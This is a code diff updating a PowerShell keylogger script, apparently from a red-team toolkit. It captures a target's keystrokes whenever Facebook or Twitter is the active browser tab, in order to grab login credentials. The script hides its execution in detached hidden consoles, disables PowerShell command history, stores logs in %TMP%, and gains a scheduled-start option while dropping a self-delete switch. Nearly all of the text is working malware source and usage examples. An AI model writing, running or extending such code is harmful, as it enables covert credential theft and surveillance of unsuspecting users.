@@ -6,42 +6,44 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand
-   PS cmdlet Dev version: v1.3.10
+   PS cmdlet Dev version: v1.4.10
    
 .DESCRIPTION
    Capture target keyboard keystrokes if facebook or
    twitter is open in web browser (browser active tab)
+   This cmdlet will NOT messup with browser or system!
 
 .NOTES
    Browsers supported:MsEdge,Chrome,Chromium,Opera,Safari,Firefox
    The logfiles will be saved under target %TMP% directory under
-   names 1_[random].Facebook OR 1_[random].Twitter extensions
+   names 1_[random].Facebook OR 1_[random].Twitter extensions.
 
    Cmdlet only starts recording keystrokes if facebook or twitter
    its active on browser tab, and it stops is execution if target
    switchs from social media to another site or closes browser, it
    resume capture if social media is accessed again. (active tab)
+   We can also schedule this cmdlet execution to start at [HH:mm]
 
-   1300 milliseconds (default) its the amont of time required for
+   1200 milliseconds (default) its the amont of time required for
    key`loger to start execution and build pid.log file. If we chose
    to use less than 1 second delay then cmdlet executes more than
    one instance of powershell (all PIDs will be stoped in the end)
    and that will allow us to have more changes to capture logins.
 
-.Parameter Action
+.Parameter Mode
    Start or Stop key`logger (default: start)
 
 .Parameter Delay
-   Milliseconds delay between loops (default: 1300)
+   Milliseconds delay between loops (default: 1200)
 
 .Parameter Force
    Switch to bypass check: Is_Browser_Active?
 
-.Parameter AutoDel
-   Switch that deletes this cmdlet in the end
+.Parameter Schedule
+   Schedule cmdlet execution at: [HH:mm]
 
 .EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -action 'start'
+   PS C:\> .\SocialMedia.ps1 -Mode 'start'
    Start browser key`logger capture 
 
 .EXAMPLE
@@ -53,15 +55,19 @@
    Bypass check: Is_Browser_Active?
 
 .EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -AutoDel
-   Auto-delete this cmdlet in the end!
-
-.EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -action 'stop'
+   PS C:\> .\SocialMedia.ps1 -Mode 'stop'
    Stop key`logger and leak keystrokes on screen 
 
 .EXAMPLE
-   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -action 'start' -delay '200' -force -autodel"
+   PS C:\> .\SocialMedia.ps1 -schedule '02:34' -Mode 'start'
+   Schedule cmdlet capture to start at [HH:mm] hours
+   
+.EXAMPLE
+   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -schedule '02:34' -Mode 'start' -force"
+   Schedule cmdlet capture to start at -shedule '[HH:mm]' hours and Bypass check: Is_Browser_Active?
+
+.EXAMPLE
+   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -Mode 'start' -delay '200' -force"
    Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials   
 
 .INPUTS
@@ -90,23 +96,37 @@
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
-   [string]$Action="start",
-   [int]$Delay='1300',
-   [switch]$AutoDel,
+   [string]$Mode="start",
+   [string]$Schedule="now",
+   [int]$Delay='1200',
    [switch]$Force
 )
 
 
-$CmdletVersion = "v1.3.10"
+Clear-Host
+$CmdletVersion = "v1.4.10"
+$CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+
+$StartBanner = @"
+ )\ )                    (    (             (               
+(()/(          (      )  )\   )\))(     (   )\ )  (      )  
+ /(_)) (    (  )\  ( /( ((_) ((_)()\   ))\ (()/(  )\  ( /(  
+(_))   )\   )\((_) )(_)) _   (_()((_) /((_) ((_))(_) (_)) 
+/ __| ((_) ((_)(_)((_)_ | |  |  \/  |(_))   _| |(_)((_)_  
+\__ \/ _ \/ _| | |/ _  || |  | |\/| |/ -_)/ _  || |/ _  | 
+|___/\___/\__| |_|\__,_||_|  |_|  |_|\___|\__,_||_|\__,_|
+"@;
+
+write-host $StartBanner -ForegroundColor DarkRed
+write-host "   * GitHub: https://github.com/r00t-3xp10it/redpill *" -ForegroundColor DarkYellow
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
-If(-not($AutoDel.IsPresent))
-{
-   $CurrentTime = (Get-Date -Format 'HH:mm')
-   write-host "`n  ╰➤ [$CurrentTime] Social media key`logger!" -ForegroundColor Green
-}
+write-host "`n  ╰➤ [" -ForegroundColor Green -NoNewline
+write-host "$CurrentTime" -NoNewline
+write-host "] Social media key`logger!" -ForegroundColor Green
+
 
 ## Browser names
 $BrowserNames = @(
@@ -169,6 +189,43 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Keystrokes")
 
 
+function Invoke-ScheduleStart ()
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Schedule cmdlet execution! [HH:mm]
+   #>
+
+   If($Schedule -match '^(\d+\d+:+\d+\d)$')
+   {
+      write-host "   ╰➤ " -ForegroundColor Red -NoNewline
+      write-host "Execution schedule to " -ForegroundColor Blue -NoNewline
+      write-host "$Schedule" -ForegroundColor Red -NoNewline
+      write-host " hours.`n" -ForegroundColor Blue
+
+      while($true)
+      {
+         ## Compare $CurrentTime with $StartTime
+         $CurrentTime = (Get-Date -Format 'HH:mm')
+         If($CurrentTime -match "$Schedule")
+         {
+            break # Continue SocialMedia cmdlet execution
+         }
+
+         ## loop each 10 seconds
+         Start-Sleep -Seconds 10
+      }
+   }
+   Else
+   {
+      write-host "   ╰➤ Abort: " -ForegroundColor Red -NoNewline
+      write-host "wrong -schedule '" -NoNewline
+      write-host "$Schedule" -ForegroundColor Red -NoNewline
+      write-host "' user input! (execute:now)`n"  
+   }
+}
+
 function Invoke-KillAllPids ()
 {
    <#
@@ -202,25 +259,22 @@ function Invoke-IsBrowserActive ()
       Helper - Prevent cmdlet execution if browser closed!
    #>
 
-   If(-not($Force.IsPresent))
+   $TestBrowsers = @()
+   ForEach($Tokens in $BrowserNames)
    {
-      $TestBrowsers = @()
-      ForEach($Tokens in $BrowserNames)
+      ## Get names from active browsers only
+      $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
+      If(-not([string]::IsNullOrEmpty($Stats)))
       {
-         ## Get names from active browsers only
-         $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
-         If(-not([string]::IsNullOrEmpty($Stats)))
-         {
-            $TestBrowsers += "$Tokens"
-         }
+         $TestBrowsers += "$Tokens"
       }
+   }
 
-      ## Make sure we have active browser names
-      If([string]::IsNullOrEmpty($TestBrowsers))
-      {
-         write-host "`n   > Error: none supported browsers found active.`n" -ForegroundColor Red
-         exit ## Exit cmdlet execution (default)
-      }
+   ## Make sure we have active browser names
+   If([string]::IsNullOrEmpty($TestBrowsers))
+   {
+      write-host "`n   > Error: none supported browsers found active.`n" -ForegroundColor Red
+      exit ## Exit cmdlet execution (default)
    }
 }
 
@@ -284,15 +338,18 @@ function Invoke-CheckMediaForChange ()
 }
 
 
-If($Action -iMatch '^(start)$')
+If($Mode -iMatch '^(start)$')
 {
    [int]$Counter = 0
    $TestBrowsers = $BrowserNames
    ## Build mscore.ps1 cmdlet in %TMP%
    echo $RawCmdlet|Out-File "$Env:TMP\mscore.ps1" -Encoding string -Force
 
+   ## Schedule_Cmdlet_Start?
+   If(-not($Schedule -match '^(now)$')){Invoke-ScheduleStart}
+
    ## Is_Browser_Active?
-   Invoke-IsBrowserActive
+   If(-not($Force.IsPresent)){Invoke-IsBrowserActive}
 
    echo ""
    ## :meterpeter> requires this PID
@@ -344,7 +401,7 @@ If($Action -iMatch '^(start)$')
 
                   ## Execute key`logger in a hidden windows console detach from parent process
                   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\mscore.ps1"
-                  Start-Sleep -Milliseconds 1600 # Give extra time for execution
+                  Start-Sleep -Milliseconds 1700 # Give extra time for execution
                }
 
                ## Key`logger running -- backup void.log logfile
@@ -393,7 +450,7 @@ If($Action -iMatch '^(start)$')
 }
 
 
-If($Action -iMatch '^(stop)$')
+If($Mode -iMatch '^(stop)$')
 {
    <#
    .SYNOPSIS
@@ -404,6 +461,7 @@ If($Action -iMatch '^(stop)$')
    ## Kill all PID's
    Invoke-KillAllPids
 
+   write-host ""
    $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
@@ -461,10 +519,4 @@ If($Action -iMatch '^(stop)$')
 
 ## CleanUP
 Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
-
-
-If($AutoDel.IsPresent)
-{
-   ## Auto Delete this cmdlet in the end ...
-   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
-}
+exit
